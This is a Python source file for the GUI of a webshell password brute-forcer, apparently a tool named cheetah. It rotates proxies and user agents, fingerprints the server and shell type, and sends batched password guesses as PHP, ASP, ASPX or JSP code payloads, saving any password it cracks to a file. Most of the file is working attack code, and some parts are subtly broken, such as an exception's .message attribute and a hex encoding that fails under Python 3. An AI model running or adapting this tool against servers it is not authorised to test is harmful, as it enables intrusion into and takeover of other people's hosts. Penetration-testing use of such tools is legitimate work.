# coding=utf-8
from __future__ import division
import sys
import time
import string
import random
import requests
import webbrowser
from os import path
from cheetah_init import initialize_cheetah
from cheetah_validator import is_url
from cheetah_config_operation import read_config
import cheetah_about
import cheetah_config
import cheetah_dictionary
import cheetah_docs
import cheetah_proxy
import cheetah_update

if sys.version_info.major == 2:
    from urlparse import urlparse
    from Tkinter import *
    from tkFileDialog import askopenfilename
    from tkMessageBox import showinfo, showerror, showwarning
    from BaseHTTPServer import BaseHTTPRequestHandler
    from StringIO import StringIO
else:
    from urllib.parse import urlparse
    from tkinter import *
    from tkinter.filedialog import askopenfilename
    from tkinter.messagebox import showinfo, showerror, showwarning
    from http.server import BaseHTTPRequestHandler
    from io import StringIO

data_dir = path.abspath(path.join(path.dirname(__file__), path.pardir, 'data'))


def set_tk_var():
    global target
    target = StringVar()
    target.set("http://localhost/post_shell.php")
    global state
    state = StringVar()
    state.set("Start")
    global progress_status
    progress_status = StringVar()
    progress_status.set("Progress status: Ready")


def check_updates():
    cheetah_update.create_cheetah_update(root)


def open_about():
    cheetah_about.create_cheetah_about(root)


def open_docs():
    cheetah_docs.create_cheetah_docs(root)


def set_dict():
    cheetah_dictionary.create_cheetah_dictionary_setting(root)


def set_parameters():
    cheetah_config.create_cheetah_config(root)


def set_proxy():
    cheetah_proxy.create_cheetah_proxy_setting(root)


def set_url_file():
    url_file = askopenfilename(initialfile=w.url_path, initialdir=w.data_dir,
                               parent=root, filetypes=[("text files", "*.txt")])
    if path.isfile(url_file):
        w.TCombobox1.delete(0, END)
        w.TCombobox1.insert(0, url_file)
        w.TCombobox1.set(url_file)
    elif len(url_file) != 0:
        title = "Cheetah Error"
        message = "The selected file should be text file."
        showerror(title, message, parent=root)


def format_time():
    return ' [' + time.strftime("%H:%M:%S", time.localtime()) + '] '


def format_output(level, message):
    format_msg = ""
    if level == 'i':
        format_msg = "[INFO]  {} {}".format(format_time(), message)
    elif level == 'w':
        format_msg = "[WARN]  {} {}".format(format_time(), message)
    elif level == 'e':
        format_msg = "[ERROR] {} {}".format(format_time(), message)
    elif level == 'h':
        format_msg = "[HINT]  {} {}".format(format_time(), message)
    w.Scrolledlistbox1.insert(END, format_msg)
    root.update()
    w.Scrolledlistbox1.see(END)


class HTTPRequest(BaseHTTPRequestHandler):
    def __init__(self, request_text):
        self.rfile = StringIO(request_text)
        self.raw_requestline = self.rfile.readline()
        self.parse_request()


def forge_header(options):
    header = requests.utils.default_headers()
    req_host = urlparse(options.url).netloc
    header['Host'] = req_host
    if options.rand_ua:
        agent_path = path.join(data_dir, 'user-agent.txt')
        with open(agent_path, encoding='utf-8') as agent_file:
            agent_list = agent_file.readlines()
            random_agent = random.choice(agent_list).strip()
            header['User-Agent'] = random_agent
    if options.con_close:
        header['Connection'] = 'close'
    if options.keep_alive:
        header['Keep-Alive'] = '0'
    if options.cus_hdr:
        if len(options.cus_hdr_data) != 0:
            req_type = options.req_type.upper()
            req_path = urlparse(options.url).path
            cus_hdr_data = "{} {} HTTP/1.0\n{}".format(req_type, req_path, options.cus_hdr_data)
            request = HTTPRequest(cus_hdr_data)
            # header = dict(request.headers)
            for key in request.headers.keys():
                header[key] = request.headers[key]
    return header


def get_proxy(options):
    proxies = None
    if options.use_proxy:
        proxy_path = path.join(data_dir, 'proxy.txt')
        with open(proxy_path, encoding='utf-8') as proxy_file:
            proxy_list = proxy_file.readlines()
            if len(proxy_list) != 0:
                proxy = random.choice(proxy_list).strip()
                scheme = proxy.split('://', 1)
                proxies = {}
                if scheme == 'http':
                    proxies['http'] = proxy
                elif scheme == 'https':
                    proxies['https'] = proxy
                else:
                    proxies['http'] = proxy
                    proxies['https'] = proxy
                return proxies
            else:
                return proxies
    return proxies


def req_get(payload, times, options):
    header = forge_header(options)
    if options.req_delay != 0:
        format_output('i', 'Sleeping ' + str(options.time) + ' seconds to request')
        time.sleep(options.time)
    format_output('i', 'Sending ' + str(times) + 'the group payload')
    format_output('i', 'Waiting for web server response')
    proxies = get_proxy(options)
    try:
        r = requests.get(url=options.url,
                         headers=header,
                         params=payload,
                         timeout=options.time_out,
                         proxies=proxies,
                         verify=False)
    except Exception as e:
        format_output('e', e.message)
        return 'error'

    error_msg = options.url + ' response code: ' + str(r.status_code)
    if r.status_code == 404:
        format_output('e', error_msg)
        format_output('w', 'Maybe the request url incorrect')
        format_output('h', 'Try to check the url ' + options.url)
        return 'error'

    code = [413, 414, 500]
    if r.status_code in code:
        format_output('e', error_msg)
        format_output('w', 'Request url too long when request ' + options.url)
        format_output('h', 'Try to specify a smaller parameter value')
        return 'error'

    if r.status_code in range(200, 300):
        format_output('i', 'Web server responds successfully')
        if r.text in payload:
            find_path = path.abspath(path.join(path.dirname(__file__), path.pardir, 'data', 'find.txt'))
            with open(find_path, mode='a', encoding='utf-8') as find_file:
                find_file.write(options.url + '\t\t' + r.text + '\n')
            format_output('h', 'The password of {} is {}'.format(options.url, r.text))
            title = "Cheetah Info"
            message = "The password of {} is {}".format(options.url, r.text)
            showinfo(title, message, parent=root)
            format_output('h', 'Password has been written to ../data/find.txt')
            return 'find'
        else:
            format_output('h', 'The password not in ' + str(times) + 'th group payload')
            return 'notfind'
    else:
        format_output('e', error_msg)
        return 'error'


def req_post(payload, times, options):
    header = forge_header(options)
    if options.req_delay != 0:
        format_output('i', 'Sleeping ' + str(options.req_delay) + ' seconds to request')
        time.sleep(options.req_delay)
        format_output('i', 'Posting ' + str(times) + 'th group payload')
        format_output('i', 'Waiting for web server response')
    proxies = get_proxy(options)
    try:
        r = requests.post(url=options.url,
                          headers=header,
                          data=payload,
                          timeout=options.time_out,
                          proxies=proxies,
                          verify=False)
    except Exception as e:
        format_output('e', str(e))
        return 'error'

    error_msg = options.url + ' response code: ' + str(r.status_code)
    if r.status_code == 404:
        format_output('e', error_msg)
        format_output('w', 'Maybe the request url incorrect')
        format_output('h', 'Try to check the url ' + options.url)
        return 'error'

    code = [413, 414, 500]
    if r.status_code in code:
        format_output('w', 'Request url too long when request ' + options.url)
        format_output('h', 'Try to specify a smaller parameter value')
        return 'error'

    if r.status_code in range(200, 300):
        format_output('i', 'Web server responds successfully')
        if r.text in payload:
            find_path = path.abspath(path.join(path.dirname(__file__), path.pardir, 'data', 'find.txt'))
            with open(find_path, mode='a', encoding='utf-8') as find_file:
                find_file.write(options.url + '\t\t' + r.text + '\n')
            format_output('h', 'The password of {} is {}'.format(options.url, r.text))
            title = "Cheetah Info"
            message = "The password of {} is {}".format(options.url, r.text)
            showinfo(title, message, parent=root)
            format_output('h', 'Password has been written to ../data/find.txt')
            return 'find'
        else:
            format_output('h', 'The password not in ' + str(times) + 'th group payload')
            return 'notfind'
    else:
        format_output('e', error_msg)
        return 'error'


def detect_web(options):
    format_output('w', 'Setting up automatic probe server type and webshell type')
    format_output('w', 'Detecting server info of ' + options.url)
    server_list = ['apache', 'nginx', 'iis']
    shell_list = ['php', 'aspx', 'asp', 'jsp']
    header = forge_header(options)
    web_hint = 'Web server may be '
    shell_hint = 'The shell type may be '
    if options.shell_type == 'detect':
        for shell in shell_list:
            if shell in options.url.lower():
                format_output('h', shell_hint + shell)
                options.shell_type = shell
                break

    if options.server_type == 'detect' or options.shell_type == 'detect':
        proxies = get_proxy(options)
        try:
            get_rsp = requests.get(url=options.url,
                                   headers=header,
                                   timeout=options.time_out,
                                   proxies=proxies,
                                   verify=False)
        except Exception as e:
            format_output('e', str(e))
            return 'error'

        if 'server' in get_rsp.headers:
            format_output('h', web_hint + get_rsp.headers['server'])
            options.server_type = get_rsp.headers['server'].lower()

        if 'x-powered-by' in get_rsp.headers:
            power_hint = 'Web server may be x-powered-by '
            format_output('h', power_hint + get_rsp.headers['x-powered-by'])
            if options.shell_type == 'detect':
                for shell in shell_list:
                    if shell in get_rsp.headers['x-powered-by'].lower():
                        format_output('h', shell_hint + shell)
                        options.shell_type = shell
                        break
            if options.server_type == 'detect':
                for server in server_list:
                    if server in get_rsp.headers['x-powered-by'].lower():
                        format_output('h', web_hint + server)
                        options.server_type = server
                        break

    if options.server_type == 'detect':
        random_str = str(random.sample(string.printable, 5)).encode('hex')
        random_url = options.url + random_str
        random_rsp = requests.get(url=random_url, headers=header, verify=False)
        if random_rsp.status_code == 404:
            for server in server_list:
                if server in str(random_rsp.text).lower():
                    format_output('h', web_hint + server)
                    options.server_type = server
                    break

    if options.server_type == 'detect':
        put_rsp = requests.put(url=options.url, headers=header, verify=False)
        if put_rsp.status_code == 405 or put_rsp.status_code == 411:
            options.server_type = 'nginx'
            format_output('h', web_hint + options.server_type)
        if put_rsp.status_code == 200:
            options.server_type = 'apache'
            format_output('h', web_hint + options.server_type)

    if options.server_type == 'detect':
        del_rsp = requests.delete(url=options.url, headers=header, verify=False)
        if del_rsp.status_code == 501:
            options.server_type = 'iis'
            format_output('h', web_hint + options.server_type)
        if del_rsp.status_code == 403:
            options.server_type = 'apache'
            format_output('h', web_hint + options.server_type)


def set_max_req(options):
    format_output('i', "Setting appropriate number of parameters")
    if options.req_type == 'post':
        if 'apache' in options.server_type:
            if options.para_num > 1000:
                options.para_num = 1000
        elif 'nginx' in options.server_type:
            if options.para_num > 1000:
                options.para_num = 1000
        elif 'iis' in options.server_type:
            if options.para_num > 4000:
                options.para_num = 4000
        else:
            if options.para_num > 1000:
                options.para_num = 1000
    if options.req_type == 'get':
        if 'apache' in options.server_type:
            if options.para_num > 100:
                options.para_num = 100
        elif 'nginx' in options.server_type:
            if options.para_num > 756:
                options.para_num = 756
        elif 'iis' in options.server_type:
            if options.para_num > 45:
                options.para_num = 45
        else:
            if options.para_num > 45:
                options.para_num = 45
    if options.req_type == 'both':
        if 'apache' in options.server_type:
            if options.para_num > 100:
                options.para_num = 100
        elif 'nginx' in options.server_type:
            if options.para_num > 756:
                options.para_num = 756
        elif 'iis' in options.server_type:
            if options.para_num > 45:
                options.para_num = 45
        else:
            if options.para_num > 45:
                options.para_num = 45
    format_output('i', 'The web server {} {} default setting {}'
                  .format(options.server_type, options.req_type, options.para_num))


class GetOptions:
    def __init__(self):
        self.url = str()
        self.target_obj = target.get()
        self.pro_state = state.get()
        self.req_type = read_config("Config", "Method", "str")
        self.server_type = read_config("Config", "Server", "str")
        self.shell_type = read_config("Config", "ShellType", "str")
        self.para_num = read_config("Config", "Parameter", "int")
        self.thread_num = read_config("Config", "ThreadNumber", "int")
        self.req_delay = read_config("Config", "RequestDelay", "float")
        self.time_out = read_config("Config", "RequestTimeout", "float")
        self.rand_ua = read_config("Config", "RandomUserAgent", "boolean")
        self.con_close = read_config("Config", "ConnectionClose", "boolean")
        self.keep_alive = read_config("Config", "KeepAlive0", "boolean")
        self.cus_hdr = read_config("Config", "CustomRequestHeader", "boolean")
        self.cus_hdr_data = read_config("Config", "CustomRequestHeaderData", "str")
        self.dict_path = read_config("Dictionary", "Path", "str")
        self.use_proxy = read_config("Proxy", "proxy", "boolean")


def get_url(options):
    url_list = list()
    if path.isfile(options.target_obj):
        if path.exists(options.target_obj):
            with open(options.target_obj, encoding='utf-8') as url_file:
                for line in url_file:
                    line = line.strip()
                    if isinstance(line, str):
                        if len(line) != 0:
                            if is_url(line):
                                url_list.append(line)
                            else:
                                title = "Cheetah Warn"
                                message = "%s is not a valid URL and will skip this address." % line
                                showwarning(title, message, parent=root)
    else:
        if isinstance(options.target_obj, str):
            target_str = options.target_obj.strip()
            if len(target_str) != 0:
                if is_url(target_str):
                    url_list.append(target_str)
                else:
                    title = "Cheetah Error"
                    message = "%s is not a valid URL." % options.target_obj
                    showerror(title, message, parent=root)
                    return url_list
    return url_list


def brute_force():
    progress_status.set("Progress status: Start")
    options = GetOptions()
    url_list = get_url(options)
    url_num = len(url_list)
    if url_num == 0:
        title = "Cheetah Error"
        message = "No valid URL address."
        showerror(title, message, parent=root)
        return
    for url in url_list:
        options.url = url
        if url_num > 1:
            options.server_type = 'detect'
            options.shell_type = 'detect'
        if options.server_type == 'detect' or options.shell_type == 'detect':
            detect_web(options)
        set_max_req(options)
        format_output('i', 'Opening password file ' + options.dict_path)
        pwd_file = open(options.dict_path, encoding='utf-8')
        total_size = path.getsize(options.dict_path)
        format_output('h', 'Using password file ' + options.dict_path)
        format_output('i', 'Cracking password of ' + options.url)

        times = 0
        find = False
        last = False
        while not find:
            if last:
                break
            times += 1
            pwds = list()
            for x in range(options.para_num):
                read_size = pwd_file.tell()
                progress = read_size * 100 / total_size
                progress_status.set("Progress status: {:.1f}%".format(progress))
                line = pwd_file.readline()
                if line == "":
                    last = True
                    break
                pwds.append(line.strip())
            payload = dict()
            for pwd in pwds:
                if options.shell_type == 'php':
                    payload[pwd] = '$s=' + pwd + ';print($s);'
                if options.shell_type == 'asp':
                    payload[pwd] = 'response.write("' + pwd + '")'
                if options.shell_type == 'aspx':
                    payload[pwd] = 'Response.Write("' + pwd + '");'
                if options.shell_type == 'jsp':
                    payload[pwd] = 'System.out.println("' + pwd + '");'
            del pwds[:]

            if options.req_type == 'post':
                res = req_post(payload, times, options)
                if res == 'find':
                    # pwd_find = 'find'
                    find = True
                    break
                if res == 'error':
                    # pwd_find = 'error'
                    break

            if options.req_type == 'get':
                res = req_get(payload, times, options)
                if res == 'find':
                    # pwd_find = 'find'
                    find = True
                    break
                if res == 'error':
                    # pwd_find = 'error'
                    break
            payload.clear()
        pwd_file.close()

        if not find:
            format_output('w', 'The cheetah did not find the webshell password')
            format_output('h', 'Try to change a better password dictionary file')
            format_output('h', 'Try to specify a smaller value')
            if options.use_proxy:
                format_output('h', 'Try to disable proxy')
            if options.req_type == 'post':
                format_output('h', 'Try to specify GET request method')
            if options.req_type == 'get':
                format_output('h', 'Try to specify POST request method')


def save_log():
    logs = w.Scrolledlistbox1.get("0", END)
    log_path = path.join(data_dir, 'log.txt')
    with open(log_path, mode='a', encoding='utf-8') as log_file:
        log_file.write("\n".join(logs))


def start_brute_force():
    if state.get() == "Start":
        state.set("Running")
        w.TButton2.configure(state="disable")
        format_output('i', "The cheetah begins execution")
        brute_force()
        format_output('i', "The cheetah ends execution")
        progress_status.set("Progress status: End")
        progress_status.set("Progress status: Ready")
        state.set("Start")
        w.TButton2.configure(state="normal")
        save_log()


def submit_bugs():
    bug_url = "https://github.com/sunnyelf/cheetah-gui/issues"
    webbrowser.open(bug_url)


def init(top, gui):
    global w, top_level, root
    w = gui
    top_level = top
    root = top
    initialize_cheetah(root)


def destroy_window():
    # Function which closes the window.
    global top_level
    top_level.destroy()
    top_level = None
    save_log()


if __name__ == '__main__':
    import cheetah

    cheetah.vp_start_gui()
